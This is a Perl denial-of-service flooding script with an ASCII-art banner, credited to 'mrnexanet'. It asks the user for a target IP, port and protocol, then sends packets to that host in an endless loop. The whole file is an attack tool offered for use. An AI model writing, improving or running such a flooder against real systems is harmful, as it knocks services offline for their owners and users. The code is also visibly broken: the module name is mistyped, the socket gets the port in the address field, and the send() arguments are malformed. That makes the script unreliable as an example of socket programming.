#!/usr/bin/perl

use IO:Socket;

system("clear || cls");
#Script Banner=========================================================================================
print q{
         |\        /| |\\\\\\\\\\\           ||||||||||   ||||||||||| |\     | ||||||||||        /\      |
         | \      / | |          /           |       | |  ||          | \    |    |||           /  \     |
         |  \    /  | |         /            |       | |  ||||||||||| |  \   |    |||          /    \    |
         |   \__/   | |________/             |       | |  ||||||||||| |   \  |    |||         /\/\/\/\   |
         |          | | \                    |       | |  ||          |    \ |    |||        |        |  | 
         |          | |  \________________   ||||||||||   ||||||||||| |     \| ||||||||||    |        |  ||||||||||
########################(@ '...............' Welcome!

[----]  by:> mrnexanet [----]
[----]  version:> 1.5  [----]
};
# INPUT  TARGET INFO ====================================================================================
print "\n===========================";
print "\n Enter TargetIP; "; # Set Target IP
chop ($host = <stdin>);
print "===============================";
print "\n Enter Port: "; # Set Port
chop ($port = <stdin>);
print "===============================";
print "\n Enter Protockol (TCP or UDP) :"; # Set Protockol
chop ($proto = <stdin>);
system("clear || cls");
print "\n[*]Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
sleep 3;

{
$sock = IO::Socket::INET->new (
    PeerAddr => $host,
    PeerAddr => $port,
    proto => "$proto"  ) || die "\n start Attack !";


}    
packets:
while (1) {
$size = rand() * 8921873 * 99919988;
print ("Packets send; $size\n");
send($sock, 9999999999999999999999999999999999999999999999999999999999999, $size);
packets2:
$size = rand() * 8921873 * 99919988;
send($sock, 9999999999999999999999999999999999999999999999999999999999999, $size);
packets3:
$size = rand() * 8921873 * 99919988;
send($sock, 9999999999999999999999999999999999999999999999999999999999999, $size);
packets4:
$size = rand() * 8921873 * 99919988;
print " (=>$host:$port:$proto<=)";
send($sock, $size, $size, $size); # Attack start#####################

}


####################################################################################
###########################                         ################################
#######################       END OF THE SCRIPT       ##############################
#######################                               ##############################
#########################                           ################################
####################################################################################
#This Script by mrnexanet
#Have a nice day :)
#Goodbye

